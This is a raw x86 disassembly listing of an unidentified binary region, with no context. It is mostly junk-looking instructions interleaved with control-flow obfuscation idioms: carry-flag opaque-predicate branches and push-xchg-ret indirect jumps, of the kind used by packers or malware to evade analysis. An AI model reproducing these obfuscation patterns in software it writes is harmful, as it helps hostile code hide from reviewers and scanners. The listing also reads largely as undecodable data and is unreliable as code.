  40ebd1:	es ret 0x0
  40ebd5:	mov    ch,0x10
  40ebd7:	jle    0x40ec07
  40ebd9:	fisubr WORD PTR [esi]
  40ebdb:	loope  0x40eb9a
  40ebdd:	xchg   edx,eax
  40ebde:	xor    eax,eax
  40ebe0:	nop
  40ebe1:	ds jmp 0x40b188
  40ebe7:	pop    ecx
  40ebe8:	adc    al,0xae
  40ebea:	(bad)  
  40ebeb:	fidiv  WORD PTR [ebp-0x5f2eebec]
  40ebf1:	and    DWORD PTR [esi+0x21],edi
  40ebf4:	xor    BYTE PTR [ebp+0x21214a7d],0x41
  40ebfb:	test   BYTE PTR [eax],dh
  40ebfd:	pop    es
  40ebfe:	push   esi
  40ebff:	push   esi
  40ec00:	repz cld 
  40ec02:	repz mov esi,0x40d0f3
  40ec08:	xchg   DWORD PTR ds:[esp],esi
  40ec0c:	bnd ret 0x0
  40ec10:	and    DWORD PTR [esi*4-0x4ade2e04],edx
  40ec17:	mov    ch,0x14
  40ec19:	mov    esi,0x7400c6b5
  40ec1e:	add    BYTE PTR [eax],al
  40ec20:	mov    esp,0x2dc8
  40ec25:	bound  edi,QWORD PTR [ecx+0x636f]
  40ec2b:	pushf  
  40ec2c:	and    WORD PTR [esp],0xfe
  40ec32:	popf   
  40ec33:	jae    0x40e5b2
  40ec39:	mov    ch,0x7c
  40ec3b:	adc    BYTE PTR [edi+0x7c],ah
  40ec3e:	push   ebx
  40ec3f:	adc    BYTE PTR [ebp+0x42b5beb5],dh
  40ec45:	mov    edi,DWORD PTR [ebp+0x24]
  40ec48:	nop
  40ec49:	cld    
  40ec4a:	ds jmp 0x40e29d
  40ec50:	or     BYTE PTR [ebp+0x67d17dc6],dh
  40ec56:	pop    ecx
  40ec57:	mov    ch,0xb5
  40ec59:	mov    esi,0x8f677dde
  40ec5e:	jge    0x40ecde
  40ec60:	(bad)
  40ec64:	cmp    edi,0x8bfa452
  40ec6a:	push   ecx
  40ec6b:	ss repnz nop
  40ec6e:	lea    ecx,ds:0x40b30b
  40ec74:	nop
  40ec75:	xchg   DWORD PTR [esp],ecx
  40ec78:	cs ret 0x0
  40ec7c:	adc    BYTE PTR [ebp-0x71],bh
  40ec7f:	dec    edx
  40ec80:	pop    ecx
  40ec81:	or     BYTE PTR [ebx+0x2d],al
  40ec84:	add    BYTE PTR [eax],al
  40ec86:	add    BYTE PTR [eax+0x2481669c],al
  40ec8c:	and    al,0xfe
  40ec8e:	add    BYTE PTR [ebp-0x179b7cf1],bl
  40ec94:	(bad)  
  40ec95:	(bad)  
  40ec96:	jge    0x40ed16
  40ec98:	rol    DWORD PTR [ecx-0x60],1
  40ec9b:	adc    cl,ah
  40ec9d:	dec    edx
  40ec9e:	dec    edx
  40ec9f:	pop    ecx
  40eca0:	ins    DWORD PTR es:[edi],dx
  40eca1:	cmp    eax,0x4c4831a
  40eca6:	pushf  
  40eca7:	and    WORD PTR [esp],0xfe
  40ecad:	popf   
  40ecae:	jae    0x40d3c1
  40ecb4:	lahf   
  40ecb5:	mov    esi,0x41b514fc
  40ecba:	addr16 mov al,ds:0x7e7d
  40ecbe:	jle    0x40ed0b
  40ecc0:	addr16 and eax,0xe040
  40ecc6:	mov    al,0x18
  40ecc8:	push   0xffffff8b
  40ecca:	inc    ecx
  40eccb:	adc    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40ecd2:	add    BYTE PTR [ebp-0xb577cf1],bl
  40ecd8:	(bad)  
  40ecd9:	call   FWORD PTR [edi+0x7d411408]
  40ecdf:	push   ebx
  40ece0:	addr16 cs cld 
  40ece3:	(bad)  
  40ece4:	jge    0x40ec9b
  40ece6:	dec    edx
  40ece7:	pop    eax
  40ece8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece9:	cmp    edi,DWORD PTR [ebp+0x24]
  40ecec:	repnz nop
  40ecee:	jmp    0x40a6e5
  40ecf3:	mov    ch,0x21
  40ecf5:	test   BYTE PTR [ebp-0x70f74a83],dh
  40ecfb:	mov    ch,0x14
  40ecfd:	and    DWORD PTR [ebx+0x4b],edx
  40ed00:	scas   al,BYTE PTR es:[edi]
  40ed01:	mov    ch,0xb5
  40ed03:	loope  0x40ed5e
  40ed05:	scas   al,BYTE PTR es:[edi]
  40ed06:	cld    
  40ed07:	inc    BYTE PTR [ebx+0x26530cc4]
  40ed0d:	cld    
  40ed0e:	cld    
  40ed0f:	mov    ebx,0x40e104
  40ed14:	xrelease xchg DWORD PTR [esp],ebx
  40ed18:	cld    
  40ed19:	ret    0x0
  40ed1c:	adc    al,0x9f
  40ed1e:	mov    ch,0x6d
  40ed20:	push   ebx
  40ed21:	ins    DWORD PTR es:[edi],dx
  40ed22:	mov    ch,0x2e
  40ed24:	loope  0x40ed2e
  40ed26:	jbe    0x40ecf4
  40ed28:	int3   
  40ed29:	int3   
	...
  40ed42:	add    BYTE PTR [eax],al
  40ed44:	add    BYTE PTR ds:0x2855396b,al
  40ed4a:	ss nop
  40ed4c:	cs jmp 0x40a2c1
  40ed52:	adc    al,0x21
  40ed54:	mov    al,ds:0x4ab508d1
  40ed59:	cs mov esi,0x2e41d1ae
  40ed5f:	mov    ch,0xb5
  40ed61:	cld    
  40ed62:	dec    edx
  40ed63:	mov    esi,0xccccaa21
  40ed68:	int3   
	...
  40ed81:	add    BYTE PTR [eax],al
  40ed83:	add    BYTE PTR [ebp+0x3c498bae],ah
  40ed89:	ss es jmp 0x40b011
  40ed90:	xor    BYTE PTR [ebp+0x10b5b5b5],0xc6
  40ed97:	adc    al,0xe1
  40ed99:	mov    ch,0x4b
  40ed9b:	mov    ch,0xb5
  40ed9d:	ins    DWORD PTR es:[edi],dx
  40ed9e:	mov    ch,0x53
  40eda0:	(bad)  
  40eda1:	mov    ch,0x8f
  40eda3:	mov    ch,0x7f
  40eda5:	mov    esi,DWORD PTR [esi+ebx*1+0x78]
  40eda9:	repz ss jmp 0x40bac6
  40edb0:	shl    DWORD PTR [ecx],1
  40edb2:	dec    edx
  40edb3:	mov    ch,0x82
  40edb5:	sub    al,0xb5
  40edb7:	test   BYTE PTR [ebp-0x4],ch
  40edba:	or     BYTE PTR [ebp+0x53],bh
  40edbd:	mov    ch,0xbe
  40edbf:	dec    edx
  40edc0:	mov    ch,0x8f
  40edc2:	mov    al,ds:0xc38327b9
  40edc7:	add    edx,DWORD PTR [ebx+0x3e]
  40edca:	nop
  40edcb:	cld    
  40edcc:	lea    ebx,ds:0x40c9f7
  40edd2:	cld    
  40edd3:	xchg   DWORD PTR [esp],ebx
  40edd6:	es ret 0x0
  40edda:	push   ebx
  40eddb:	and    DWORD PTR [ebp+0x538fb553],esi
  40ede1:	(bad)  
  40ede2:	mov    ch,0xe7
  40ede4:	add    ecx,0x28
  40ede7:	pushf  
  40ede8:	and    WORD PTR [esp],0xfe
  40edee:	popf   
  40edef:	jae    0x40c015
  40edf5:	cld    
  40edf6:	adc    al,0x4a
  40edf8:	dec    edx
  40edf9:	and    DWORD PTR [ebx+edx*2+0x21217dd1],eax
  40ee00:	fisubr WORD PTR [ecx*4+0x3e9057be]
  40ee07:	nop
  40ee08:	jmp    0x40b289
  40ee0d:	mov    ch,0x8f
  40ee0f:	pop    ecx
  40ee10:	adc    BYTE PTR [ecx],ah
  40ee12:	and    DWORD PTR [esi*4+0x87c08b5],edx
  40ee19:	pop    ecx
  40ee1a:	fdivp  st(4),st
  40ee1c:	dec    ebx
  40ee1d:	or     BYTE PTR [esi+0x2fc621e1],ch
  40ee23:	add    ecx,DWORD PTR [ecx+0x3c]
  40ee26:	pushf  
  40ee27:	and    WORD PTR [esp],0xfe
  40ee2d:	popf   
  40ee2e:	jae    0x40ed86
  40ee34:	sbb    eax,0x148f1d21
  40ee39:	mov    ch,0xb5
  40ee3b:	mov    esi,0x1d4a1082
  40ee40:	mov    ch,0xa8
  40ee42:	je     0x40ee39
  40ee44:	scas   eax,DWORD PTR es:[edi]
  40ee45:	je     0x40ec45
  40ee4b:	cs bnd jmp 0x40e397
  40ee52:	mov    ch,0xb5
  40ee54:	dec    edx
  40ee55:	mov    ch,0x2c
  40ee57:	test   BYTE PTR [ebp+0x1d],bh
  40ee5a:	or     BYTE PTR [esi+0x8672eb5],ch
  40ee60:	jle    0x40ee6a
  40ee62:	test   BYTE PTR [edx],cl
  40ee64:	mov    ecx,DWORD PTR [eax+0x8]
  40ee67:	pushf  
  40ee68:	and    WORD PTR [esp],0xfe
  40ee6e:	popf   
  40ee6f:	jae    0x40bc6f
  40ee75:	or     BYTE PTR [eax],dl
  40ee77:	loope  0x40ee81
  40ee79:	dec    ebx
  40ee7a:	jge    0x40ee00
  40ee7c:	jge    0x40ee0d
  40ee7e:	cs sbb eax,0x93567c9f
  40ee84:	push   esi
  40ee85:	cld    
  40ee86:	repz es mov esi,0x40e4b6
  40ee8d:	xacquire xchg DWORD PTR [esp],esi
  40ee91:	repz ret 0x0
  40ee95:	and    DWORD PTR [ebx+edx*2+0x2e],edi
  40ee99:	mov    ch,0x4b
  40ee9b:	mov    ch,0x21
  40ee9d:	scas   al,BYTE PTR es:[edi]
  40ee9e:	jle    0x40ee9c
  40eea0:	dec    ebx
  40eea1:	ja     0x40ee64
  40eea3:	jmp    0x81a78aaa
  40eea8:	and    al,0x24
  40eeaa:	inc    BYTE PTR [eax]
  40eeac:	popf   
  40eead:	jae    0x40a921
  40eeb3:	lahf   
  40eeb4:	or     cl,ah
  40eeb6:	cld    
  40eeb7:	mov    ch,0xde
  40eeb9:	or     BYTE PTR [edi-0x4a4a034b],cl
  40eebf:	mov    ch,0x31
  40eec1:	push   edi
  40eec2:	mov    ecx,eax
  40eec4:	nop
  40eec5:	nop
  40eec6:	bnd jmp 0x40f6e1
  40eecc:	and    DWORD PTR ds:0x21a07c21,ebx
  40eed2:	adc    BYTE PTR [esi*4-0x60de821f],ch
  40eed9:	cld    
  40eeda:	and    ecx,esp
  40eedc:	mov    al,ds:0x20b5b57d
  40eee1:	test   eax,0xf25e0ac5
  40eee6:	ss jmp 0x40f63d
  40eeec:	shl    DWORD PTR [eax+0x8a0107c],1
  40eef2:	push   ebx
  40eef3:	ficomp WORD PTR [ecx-0x4b]
  40eef6:	fidiv  WORD PTR [ebp+0x1d2cde10]
  40eefc:	(bad)  
  40eefd:	jl     0x40eeb4
  40eeff:	(bad)  
  40ef00:	sub    al,0xb5
  40ef02:	jge    0x40ef81
  40ef04:	add    eax,0xccccccbb
	...
  40ef21:	add    BYTE PTR [eax],al
  40ef23:	add    BYTE PTR [esi],bl
  40ef25:	dec    ecx
  40ef26:	cld    
  40ef27:	ds bnd jmp 0x40c0b3
  40ef2e:	(bad)  
  40ef2f:	cld    
  40ef30:	push   ebx
  40ef31:	pop    ecx
  40ef32:	or     cl,dl
  40ef34:	mov    ch,0x7d
  40ef36:	inc    ecx
  40ef37:	mov    ch,0xb5
  40ef39:	mov    ch,0x10
  40ef3b:	mov    esi,0xb54b84b5
  40ef40:	push   ebx
  40ef41:	lahf   
  40ef42:	mov    ch,0x43
  40ef44:	push   0x40
  40ef46:	pause  
  40ef48:	es jmp 0x40cc92
  40ef4e:	or     BYTE PTR [ebp+0x2108be7e],dh
  40ef54:	test   dh,al
  40ef56:	mov    ch,0x9f
  40ef58:	jge    0x40ef56
  40ef5a:	dec    edx
  40ef5b:	mov    esi,0xfc6dde6d
  40ef60:	mov    ch,0xe1
  40ef62:	mov    edx,0xfc265650
  40ef67:	es mov esi,0x40e0c5
  40ef6d:	xchg   DWORD PTR ds:[esp],esi
  40ef71:	bnd ret 0x0
  40ef75:	mov    ch,0xfc
  40ef77:	or     BYTE PTR [edi-0x4a1ede84],bl
  40ef7d:	pop    ecx
  40ef7e:	pop    ecx
  40ef7f:	mov    ch,0x41
  40ef81:	scas   eax,DWORD PTR es:[edi]
  40ef82:	mov    ebx,eax
  40ef84:	cs repz cld 
  40ef87:	jmp    0x40a748
  40ef8c:	sub    al,0xb5
  40ef8e:	ins    DWORD PTR es:[edi],dx
  40ef8f:	jge    0x40f00e
  40ef91:	mov    ch,0xb5
  40ef93:	ins    DWORD PTR es:[edi],dx
  40ef94:	and    DWORD PTR [esi-0x7e],edi
  40ef97:	xor    BYTE PTR [ebp+0x1d7e7e10],0x53
  40ef9e:	or     BYTE PTR [ebp-0x1c],ch
  40efa1:	xor    BYTE PTR [edx-0x33250000],0xcc
  40efa8:	int3   
	...
  40efc1:	add    BYTE PTR [eax],al
  40efc3:	add    al,dh
  40efc5:	je     0x40efd9
  40efc7:	add    esp,0xc
  40efca:	push   ebx
  40efcb:	repnz repnz es mov ebx,0x40bc90
  40efd3:	xchg   DWORD PTR ds:[esp],ebx
  40efd7:	ss ret 0x0
  40efdb:	push   ebx
  40efdc:	cs inc ecx
  40efde:	and    DWORD PTR [edi-0x704a60ad],ebx
  40efe4:	ins    DWORD PTR es:[edi],dx
  40efe5:	scas   al,BYTE PTR es:[edi]
  40efe6:	mov    ebp,esp
  40efe8:	pushf  
  40efe9:	and    WORD PTR [esp],0xfe
  40efef:	popf   
  40eff0:	jae    0x40f4b9
  40eff6:	addr16 sub al,0xde
  40eff9:	addr16 loope 0x40efb1
  40effc:	sub    al,0x8
  40effe:	shl    DWORD PTR [eax+0x59be7d08],1
  40f004:	(bad)  
  40f005:	popa   
  40f006:	push   edx
  40f007:	repz ds cld 
  40f00a:	mov    edx,0x40ee83
  40f00f:	xrelease xchg DWORD PTR [esp],edx
  40f013:	bnd ret 0x0
  40f017:	sub    al,0x6d
  40f019:	push   ebx
  40f01a:	pop    ecx
  40f01b:	sub    al,0x82
  40f01d:	jle    0x40efdd
  40f01f:	sbb    eax,0x81b5b521
  40f024:	push   edi
  40f025:	pop    ecx
  40f026:	pushf  
  40f027:	and    WORD PTR [esp],0xfe
  40f02d:	popf   
  40f02e:	jae    0x40a805
  40f034:	(bad)  
  40f035:	ins    DWORD PTR es:[edi],dx
  40f036:	and    esi,ebx
  40f038:	mov    ch,0x2e
  40f03a:	mov    ch,0x2e
  40f03c:	loope  0x40f00f
  40f03e:	mov    ch,0x4a
  40f040:	adc    ah,bh
  40f042:	or     BYTE PTR [esi+0x3],bh
  40f045:	je     0x40f078
  40f047:	sub    BYTE PTR [esi],dh
  40f049:	repz cld 
  40f04b:	jmp    0x40c51b
  40f050:	jge    0x40f007
  40f052:	mov    esi,0x2e41c6b5
  40f057:	mov    ch,0x59
  40f059:	or     dh,bl
  40f05b:	scas   al,BYTE PTR es:[edi]
  40f05c:	(bad)  
  40f05d:	fimul  WORD PTR [edx+0x2c]
  40f060:	jle    0x40f06a
  40f062:	sub    eax,0x2d64bd6c
  40f067:	jbe    0x40eff2
  40f069:	inc    esp
  40f06a:	and    al,0x1c
  40f06c:	ss repz jmp 0x40b42b
  40f073:	or     BYTE PTR [ebp-0x214a4a7e],dh
  40f079:	rcr    DWORD PTR ds:0xd1417e59,1
  40f07f:	mov    al,ds:0xb5b5b521
  40f084:	mov    ch,0xb5
  40f086:	in     eax,dx
  40f087:	jno    0x40f03f
  40f089:	push   ebx
  40f08a:	push   eax
  40f08b:	es cs repz mov eax,0x40ca55
  40f093:	xacquire xchg DWORD PTR [esp],eax
  40f097:	cs ret 0x0
  40f09b:	scas   al,BYTE PTR es:[edi]
  40f09c:	mov    ch,0xb5
  40f09e:	addr16 cs mov ch,0x7d
  40f0a2:	mov    ch,0x2e
  40f0a4:	dec    ebx
  40f0a5:	or     BYTE PTR [eax+esi*2],dl
  40f0a8:	or     esp,0xffffffcc
  40f0ab:	int3   
	...
  40f0c4:	add    BYTE PTR [eax],al
  40f0c6:	add    BYTE PTR [ecx-0x63af443b],ch
  40f0cc:	and    WORD PTR [esp],0xfe
  40f0d2:	popf   
  40f0d3:	jae    0x40e5d2
  40f0d9:	lahf   
  40f0da:	jge    0x40f091
  40f0dc:	mov    ch,0x8
  40f0de:	mov    ch,0x82
  40f0e0:	or     BYTE PTR [esi*4+0x8c64bb5],ch
  40f0e7:	dec    ebx
  40f0e8:	int3   
  40f0e9:	fld    QWORD PTR [eax]
  40f0eb:	add    ch,ah
  40f0ed:	jne    0x40f0c6
  40f0ef:	push   eax
  40f0f0:	repz es jmp 0x40de3f
  40f0f7:	dec    ebx
  40f0f8:	mov    ch,0x8f
  40f0fa:	adc    BYTE PTR [edx+0x102c21b5],al
  40f100:	jge    0x40f143
  40f102:	scas   al,BYTE PTR es:[edi]
  40f103:	ins    DWORD PTR es:[edi],dx
  40f104:	sbb    eax,0x41104ad1
  40f109:	fisubr WORD PTR [ebp+0x59]
  40f10c:	or     BYTE PTR [edi-0x16d1c9af],ch
  40f112:	iret   
  40f113:	sar    bh,0xff
  40f116:	push   ebx
  40f117:	and    DWORD PTR [ebp-0x4a21d183],esi
  40f11d:	jge    0x40f127
  40f11f:	jl     0x40f0b0
  40f121:	mov    esi,0x7cb57d2c
  40f126:	mov    ch,0x59
  40f128:	and    DWORD PTR [ebp-0x333c034b],esi
  40f12e:	int3   
  40f12f:	int3   
	...
  40f148:	add    BYTE PTR [eax],al
  40f14a:	add    BYTE PTR [edx-0x1],bl
  40f14d:	push   edi
  40f14e:	loopne 0x40f0ec
  40f150:	and    WORD PTR [esp],0xfe
  40f156:	popf   
  40f157:	jae    0x40ed08
  40f15d:	pop    ecx
  40f15e:	or     BYTE PTR [esi-0x39814a52],ch
  40f164:	mov    ch,0xb5
  40f166:	(bad)  
  40f167:	sbb    eax,0xac1921b5
  40f16c:	mov    ebp,0x6088
  40f171:	in     eax,dx
  40f172:	lea    ecx,[edi-0x75]
  40f175:	retf   
  40f176:	push   eax
  40f177:	ss es cld 
  40f17a:	lea    eax,ds:0x40d8c0
  40f180:	xrelease xchg DWORD PTR [esp],eax
  40f184:	repz ret 0x0
  40f188:	or     BYTE PTR [ebx-0x7e],cl
  40f18b:	inc    ecx
  40f18c:	ins    DWORD PTR es:[edi],dx
  40f18d:	mov    ch,0x9f
  40f18f:	mov    ch,0xe1
  40f191:	or     bh,cl
  40f193:	pop    esi
  40f194:	pushf  
  40f195:	and    WORD PTR [esp],0xfe
  40f19b:	popf   
  40f19c:	jae    0x40df3f
  40f1a2:	and    DWORD PTR [esi],ebp
  40f1a4:	mov    ch,0x8f
  40f1a6:	mov    ch,0x84
  40f1a8:	push   ebx
  40f1a9:	cld    
  40f1aa:	or     BYTE PTR [ecx],ah
  40f1ac:	mov    ch,0x8
  40f1ae:	ficom  WORD PTR [ebx+0x14]
  40f1b1:	pop    es
  40f1b2:	push   ecx
  40f1b3:	push   ebp
  40f1b4:	repnz es lea ebp,ds:0x40b10b
  40f1bd:	xrelease xchg DWORD PTR [esp],ebp
  40f1c1:	cs ret 0x0
  40f1c5:	(bad)  
  40f1c6:	ficomp WORD PTR [edi-0x41708193]
  40f1cc:	sbb    eax,0xff214a21
  40f1d1:	mov    cx,WORD PTR [esi+0x16]
  40f1d5:	pushf  
  40f1d6:	and    WORD PTR [esp],0xfe
  40f1dc:	popf   
  40f1dd:	jae    0x40ad91
  40f1e3:	mov    ch,0x84
  40f1e5:	cld    
  40f1e6:	mov    ch,0x84
  40f1e8:	jle    0x40f235
  40f1ea:	mov    ch,0xae
  40f1ec:	and    DWORD PTR [ebx-0x22],ecx
  40f1ef:	das    
  40f1f0:	mov    eax,DWORD PTR [ebp+0x14]
  40f1f3:	pushf  
  40f1f4:	and    WORD PTR [esp],0xfe
  40f1fa:	popf   
  40f1fb:	jae    0x40b589
  40f201:	dec    edx
  40f202:	ins    DWORD PTR es:[edi],dx
  40f203:	and    ecx,esp
  40f205:	addr16 cld 
  40f207:	mov    esi,0x6de18f1d
  40f20c:	pop    ecx
  40f20d:	adc    al,0x78
  40f20f:	stos   BYTE PTR es:[edi],al
  40f210:	add    edi,DWORD PTR [ebp+0x24]
  40f213:	pushf  
  40f214:	and    WORD PTR [esp],0xfe
  40f21a:	popf   
  40f21b:	jae    0x40eee4
  40f221:	scas   al,BYTE PTR es:[edi]
  40f222:	and    DWORD PTR [esi+0x7c],edi
  40f225:	and    DWORD PTR cs:0x853c621,ebx
  40f22c:	loope  0x40f2ac
  40f22e:	(bad)  
  40f22f:	push   DWORD PTR [ebp+0x24]
  40f232:	ds ss bnd jmp 0x40c229
  40f23a:	dec    edx
  40f23b:	jge    0x40f1f2
  40f23d:	mov    ch,0x82
  40f23f:	pop    ecx
  40f240:	mov    ch,0x7e
  40f242:	jl     0x40f222
  40f244:	sbb    BYTE PTR ds:0x84b6dfc,0x7e
  40f24b:	ins    DWORD PTR es:[edi],dx
  40f24c:	loope  0x40f270
  40f24e:	movsx  ecx,WORD PTR [edx]
  40f251:	pushf  
  40f252:	and    WORD PTR [esp],0xfe
  40f258:	popf   
  40f259:	jae    0x40c959
  40f25f:	and    DWORD PTR [eax],ecx
  40f261:	mov    ch,0x8
  40f263:	mov    ch,0xb5
  40f265:	ins    DWORD PTR es:[edi],dx
  40f266:	dec    ebx
  40f267:	cs sbb eax,0xe8b51408
  40f26d:	fwait
  40f26e:	add    esi,DWORD PTR [esi+0x3c]
  40f271:	pushf  
  40f272:	and    WORD PTR [esp],0xfe
  40f278:	popf   
  40f279:	jae    0x40bfaf
  40f27f:	scas   al,BYTE PTR es:[edi]
  40f280:	adc    BYTE PTR [edx+0x4141e114],al
  40f286:	mov    ch,0x9f
  40f288:	(bad)  
  40f289:	pop    ecx
  40f28a:	mov    ch,0x41
  40f28c:	mov    bl,0x89
  40f28e:	inc    edi
  40f28f:	call   0xea3de4c2
  40f294:	fcomi  st,st(4)
  40f296:	(bad)  
  40f297:	push   DWORD PTR [ebp+0x884ae08]
  40f29d:	sub    al,0xb5
  40f29f:	ficomp WORD PTR [edi-0x4adeb484]
  40f2a5:	test   dh,bl
  40f2a7:	sub    al,0x82
  40f2a9:	fisubr WORD PTR [eax+ebp*4]
  40f2ac:	jge    0x40f296
  40f2ae:	adc    al,0x40
  40f2b0:	xor    eax,DWORD PTR [eax]
  40f2b2:	add    BYTE PTR [edi],bh
  40f2b4:	dec    DWORD PTR [esp]
  40f2b7:	push   eax
  40f2b8:	cs nop
  40f2ba:	cld    
  40f2bb:	lea    eax,ds:0x40a7e4
  40f2c1:	nop
  40f2c2:	xchg   DWORD PTR [esp],eax
  40f2c5:	es ret 0x0
  40f2c9:	mov    ch,0xb5
  40f2cb:	scas   al,BYTE PTR es:[di]
  40f2cd:	inc    ecx
  40f2ce:	and    DWORD PTR [eax+0x6aa7fc1d],esp
  40f2d4:	inc    eax
  40f2d5:	pushf  
  40f2d6:	and    WORD PTR [esp],0xfe
  40f2dc:	popf   
  40f2dd:	jae    0x40dee0
  40f2e3:	mov    ch,0xfc
  40f2e5:	and    DWORD PTR [eax],ecx
  40f2e7:	mov    ch,0x7e
  40f2e9:	or     BYTE PTR [edi+0x7d],ah
  40f2ec:	mov    ch,0xb5
  40f2ee:	mov    ch,0xde
  40f2f0:	jle    0x40f2fc
  40f2f2:	add    ebp,ebx
  40f2f4:	pushf  
  40f2f5:	and    WORD PTR [esp],0xfe
  40f2fb:	popf   
  40f2fc:	jae    0x40cb16
  40f302:	adc    BYTE PTR [edx+0x59087e9f],al
  40f308:	(bad)  
  40f309:	ins    DWORD PTR es:[edi],dx
  40f30a:	mov    ch,0x21
  40f30c:	jle    0x40f316
  40f30e:	addr16 mov ch,0x69
  40f311:	ins    BYTE PTR es:[edi],dx
  40f312:	loope  0x40f2d1
  40f314:	add    BYTE PTR [ebx],dh
  40f316:	add    BYTE PTR [eax],al
  40f318:	pop    edx
  40f319:	int3   
  40f31a:	int3   
  40f31b:	int3   
	...
  40f334:	add    BYTE PTR [eax],al
  40f336:	add    BYTE PTR [ebx+0x1ac6d35],al
  40f33c:	jb     0x40f2da
  40f33e:	and    WORD PTR [esp],0xfe
  40f344:	popf   
  40f345:	jae    0x40f5ff
  40f34b:	loope  0x40f302
  40f34d:	jge    0x40f36c
  40f34f:	(bad)  
  40f350:	sbb    eax,0xb521be08
  40f355:	mov    ch,0x67
  40f357:	int3   
  40f358:	int3   
  40f359:	int3   
	...
  40f372:	add    BYTE PTR [eax],al
  40f374:	add    BYTE PTR [ebx],bl
  40f376:	call   0x40a40e
  40f37b:	ds es jmp 0x40d2e0
  40f382:	mov    ch,0xb5
  40f384:	test   BYTE PTR [edi+ebx*4],dl
  40f387:	and    DWORD PTR [esi-0x1e607b1f],edi
  40f38d:	jl     0x40f40c
  40f38f:	scas   al,BYTE PTR es:[edi]
  40f390:	push   ebx
  40f391:	and    DWORD PTR [edi+0x5243ba2c],ebx
  40f397:	ds repz repnz mov edx,0x40d802
  40f39f:	cld    
  40f3a0:	xchg   DWORD PTR [esp],edx
  40f3a3:	ds ret 0x0
  40f3a7:	ins    DWORD PTR es:[edi],dx
  40f3a8:	ins    DWORD PTR es:[edi],dx
  40f3a9:	ins    DWORD PTR es:[di],dx
  40f3ab:	test   BYTE PTR [esp+eax*4],dl
  40f3ae:	or     BYTE PTR [ebp-0x3e4a21b5],dh
  40f3b4:	test   eax,0xc694693d
  40f3b9:	push   esp
  40f3ba:	es ss jmp 0x40b0ae
  40f3c1:	pop    ecx
  40f3c2:	dec    edx
  40f3c3:	and    DWORD PTR [ebx-0x4b],edx
  40f3c6:	or     BYTE PTR [ecx],ah
  40f3c8:	xor    BYTE PTR [ebp-0x51a6ebbf],0x14
  40f3cf:	(bad)  
  40f3d0:	mov    al,ds:0x87e8f2e
  40f3d5:	mov    ch,0xb5
  40f3d7:	ret    0x3652
  40f3da:	cs nop
  40f3dc:	jmp    0x40b7aa
  40f3e1:	sub    al,0xae
  40f3e3:	push   ebx
  40f3e4:	pop    ecx
  40f3e5:	addr16 inc ecx
  40f3e7:	inc    ecx
  40f3e8:	mov    al,ds:0x1d2c0808
  40f3ed:	or     BYTE PTR ds:0xb553827c,bl
  40f3f3:	loope  0x40f3d3
  40f3f5:	adc    al,0x83
  40f3f7:	dec    DWORD PTR [esp]
  40f3fa:	push   ecx
  40f3fb:	cld    
  40f3fc:	cld    
  40f3fd:	cld    
  40f3fe:	lea    ecx,ds:0x40afe8
  40f404:	nop
  40f405:	xchg   DWORD PTR [esp],ecx
  40f408:	ss ret 0x0
  40f40c:	push   ebx
  40f40d:	jl     0x40f41f
  40f40f:	or     BYTE PTR [eax],cl
  40f411:	add    BYTE PTR [ecx-0x7c],0x1d
  40f415:	pop    ebp
  40f416:	ret    
  40f417:	int3   
  40f418:	int3   
  40f419:	int3   
	...
  40f432:	add    BYTE PTR [eax],al
  40f434:	add    BYTE PTR [edi+0xa4868b],bh
  40f43a:	add    BYTE PTR [eax],al
  40f43c:	pushf  
  40f43d:	and    WORD PTR [esp],0xfe
  40f443:	popf   
  40f444:	jae    0x40b1c6
  40f44a:	ins    DWORD PTR es:[edi],dx
  40f44b:	mov    ch,0xfc
  40f44d:	mov    ch,0x53
  40f44f:	cs jl  0x40f400
  40f452:	scas   al,BYTE PTR es:[edi]
  40f453:	jl     0x40f3ef
  40f455:	nop
  40f456:	pushf  
  40f457:	and    WORD PTR [esp],0xfe
  40f45d:	popf   
  40f45e:	jae    0x40ccf4
  40f464:	sar    DWORD PTR [esi+edi*4+0x67],1
  40f468:	mov    ch,0xb5
  40f46a:	sub    al,0xae
  40f46c:	mov    ch,0x9f
  40f46e:	inc    ecx
  40f46f:	lahf   
  40f470:	jle    0x40f4df
  40f472:	dec    edx
  40f473:	aad    0x6e
  40f475:	pop    ecx
  40f476:	cld    
  40f477:	cld    
  40f478:	jmp    0x40bf6e
  40f47d:	mov    ch,0xb5
  40f47f:	vpmacsdqh ymm15,ymm2,ymm4,ymm7
  40f485:	mov    ch,0x7d
  40f487:	(bad)  
  40f489:	sbb    eax,0xb57e217e
  40f48e:	ins    DWORD PTR es:[edi],dx
  40f48f:	mov    ch,0x4b
  40f491:	cld    
  40f492:	jge    0x40f4a4
  40f494:	pop    eax
  40f495:	sbb    eax,0xb8bb10
  40f49a:	adc    BYTE PTR [eax],al
  40f49c:	add    bl,dh
  40f49e:	es es jmp 0x40bdf8
  40f4a5:	mov    ch,0xfc
  40f4a7:	rcl    DWORD PTR [bx+si],1
  40f4aa:	addr16 pop ecx
  40f4ac:	mov    esi,0x4ab57de1
  40f4b1:	and    DWORD PTR [eax],edx
  40f4b3:	adc    al,0xfc
  40f4b5:	adc    al,0x39
  40f4b7:	xchg   esp,eax
  40f4b8:	add    bh,BYTE PTR [eax+0x2b2]
  40f4be:	pushf  
  40f4bf:	and    WORD PTR [esp],0xfe
  40f4c5:	popf   
  40f4c6:	jae    0x40c5ba
  40f4cc:	mov    al,ds:0x2cbeb57c
  40f4d1:	addr16 mov ch,0x10
  40f4d4:	jge    0x40f48b
  40f4d6:	loope  0x40f4bf
  40f4d8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4da:	repz bnd jmp 0x40f005
  40f4e1:	sbb    eax,0x2c4b08fc
  40f4e6:	jle    0x40f46a
  40f4e8:	adc    al,0x7d
  40f4ea:	pop    ecx
  40f4eb:	adc    BYTE PTR [esi+edi*2],0xc6
  40f4ef:	pop    ecx
  40f4f0:	sub    al,0x7c
  40f4f2:	ror    DWORD PTR [eax],1
  40f4f4:	mov    esi,0x9c50332e
  40f4f9:	and    WORD PTR [esp],0xfe
  40f4ff:	popf   
  40f500:	jae    0x40e1a1
  40f506:	or     BYTE PTR [edi+0x7ce18fe1],cl
  40f50c:	cs cld 
  40f50e:	dec    edx
  40f50f:	ins    DWORD PTR es:[edi],dx
  40f510:	mov    ch,0x9f
  40f512:	mov    ch,0xb5
  40f514:	addr16 aas 
  40f516:	push   ecx
  40f517:	ds es ds jmp 0x40e570
  40f51f:	cs or  cl,ah
  40f522:	adc    al,0x8
  40f524:	test   cl,ah
